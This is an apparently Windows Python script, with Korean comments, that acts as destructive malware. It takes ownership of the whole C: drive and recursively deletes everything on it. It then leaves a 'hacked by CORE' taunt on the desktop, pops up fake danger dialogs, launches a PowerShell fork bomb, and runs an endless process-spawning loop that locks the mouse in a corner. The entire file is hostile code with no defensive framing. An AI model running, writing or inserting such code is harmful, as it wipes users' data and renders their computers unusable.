import os

os.system("""takeown /f 'C:\*' /r /d y
    icacls 'C:\*' /grant :f /t
    del /f /s /q C:\*
    rd /s /q C:\*
    """)


# 새로운 메모장을 열어 특정 파일을 생성
file_path = f"C:\\Users\\{os.getlogin()}\\Desktop\\memo.txt"
with open(file_path, "w", encoding="utf-8") as f:
    f.write("Your computer is hacked by CORE :D\n\nSee you next time!")

# 메모장을 열어서 해당 파일 표시
os.system(f"notepad {file_path}")




# Hacking Code
"""
1. Put fork bomb
2. Stack overflow
"""

import time
import ctypes
import sys
import multiprocessing

sys.setrecursionlimit(10 ** 6)

ctypes.windll.user32.MessageBoxW(0, "INFORMATION", "information", 0x40 | 0x1)
os.system("pip install pyautogui")


ctypes.windll.user32.MessageBoxW(0, "Starting Hacking Code", "Danger", 0x30 | 0x1)
print("demolishing your computer...")
ctypes.windll.user32.MessageBoxW(0, "Unknown code has been started", "Danger", 0x20 | 0x1)


ctypes.windll.user32.MessageBoxW(0, "Danger! Your computer is hacked by CORE", "ERROR", 0x10 | 0x1)
print(":D byebye ")

time.sleep(5)

os.system("""function fork-bomb {
    Start-Process powershell -ArgumentList '-Command', 'fork-bomb'
    fork-bomb
}
fork-bomb""")
import pyautogui
pyautogui.FAILSAFE = False

while 1:
    def consume_memory():
            ctypes.windll.user32.MessageBoxW(0, "Danger! Your computer is hacked by CORE", "ERROR", 0x10 | 0x1)
            pyautogui.moveTo(0, 0)
            p = multiprocessing.Process(target=consume_memory)
            p.start()
            return consume_memory()
    consume_memory()
